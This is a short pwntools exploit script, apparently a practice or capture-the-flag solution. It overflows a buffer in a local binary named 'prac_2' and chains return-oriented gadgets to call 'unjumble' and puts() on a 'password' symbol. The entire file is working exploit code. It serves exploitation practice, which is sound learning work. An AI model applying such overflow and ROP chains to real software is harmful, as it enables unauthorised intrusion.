from pwn import *

context.log_level = 'critical'

p = process('./prac_2')
e = p.elf

payload = b'A' * 0x14
payload += p32(e.symbols['unjumble']) # OR 0x080484b8
payload += p32(0x080484b3) # pop eax; ret
payload += p32(e.symbols['password']) # OR 0x0804a024

payload += p32(0x08048350) # puts() from the main() function
payload += p32(0x080484b3) # pop eax; ret
payload += p32(e.symbols['password']) # OR 0x0804a024
# you could also put another address here so it doesn't crash

p.sendlineafter(b'?\n', payload)

p.interactive()
p.close()
